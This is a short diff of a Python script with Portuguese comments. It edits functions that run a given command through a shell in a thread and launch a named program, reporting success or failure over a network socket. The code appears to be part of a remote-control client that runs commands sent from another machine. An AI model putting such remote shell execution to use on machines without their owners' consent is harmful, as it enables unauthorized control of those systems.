@@ -24,15 +24,15 @@ TEMPDIR = tempfile.gettempdir() # diretório temporario do windows, onde será s
   --uac-uiaccess        Using this option allows an elevated application to
                         work with Remote Desktop.
 
-CRIAR FUNCAO EXECUTE --> ./ --> NOVA THREAD 
+CRIAR FUNCAO EXECUTE --> ./ --> NOVA THREAD
 
 
 
 '''
 
 def run(comando): # funcão que vai ser executada por uma thread
-    subprocess.Popen(comando, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-
+    comando = subprocess.Popen(comando, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    print(comando.stdout.read())
 
 def run_program(s , nome_programa):
     if(os.path.isfile(nome_programa)):
@@ -50,10 +50,8 @@ def run_program(s , nome_programa):
 
         t = threading.Thread(target=run, args = (comando,), name='run')
         t.start()
-        print('executando thread')
         s.send('0')
     else: # arquivo não existe
-        print('arquivo n existe')
         s.send('1')
 
 
